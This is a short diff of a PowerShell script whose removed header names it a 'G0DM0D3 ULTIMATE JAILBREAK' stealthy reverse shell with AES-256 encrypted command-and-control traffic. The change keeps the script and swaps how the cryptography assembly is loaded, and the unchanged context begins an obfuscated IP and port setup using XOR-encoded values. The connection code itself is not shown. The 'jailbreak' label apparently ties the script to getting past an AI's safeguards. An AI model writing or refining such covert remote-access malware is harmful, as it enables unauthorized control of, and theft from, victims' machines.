@@ -1,10 +1,5 @@
-# =============================================
-# G0DM0D3 ULTIMATE JAILBREAK v∞.0
-# Stealthy Reverse Shell with AES-256 Encrypted C2 Traffic
-# =============================================
-
-# --- [Import .NET Libraries] ---
-Add-Type -AssemblyName System.Security.Cryptography
+# Load the System.Security assembly
+[System.Reflection.Assembly]::LoadWithPartialName("System.Security")
 
 # --- [Obfuscated IP & Port Setup] ---
 $SSSSX = 0x55 -bxor 0xAA
